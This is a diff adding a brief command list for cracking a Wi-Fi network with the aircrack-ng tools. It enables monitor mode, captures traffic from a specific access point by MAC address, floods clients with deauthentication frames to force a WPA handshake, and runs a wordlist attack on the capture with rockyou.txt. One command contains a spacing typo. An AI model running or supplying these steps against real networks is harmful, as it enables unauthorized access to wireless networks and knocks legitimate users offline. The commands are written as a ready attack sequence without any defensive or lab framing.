@@ -1,0 +1,9 @@
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+1st window: sudo airodump-ng -w hack1 -c 3--bssid B4:A7:C6:88:FE:AC  wlan0mon
+2nd window: sudo aireplay-ng --deauth 0 -a B4:A7:C6:88:FE:AC wlan0mon
+
+
+at the last crack the hack file names hack1-01.cap
+aircrack-ng hack1-01.cap -w rockyou.txt
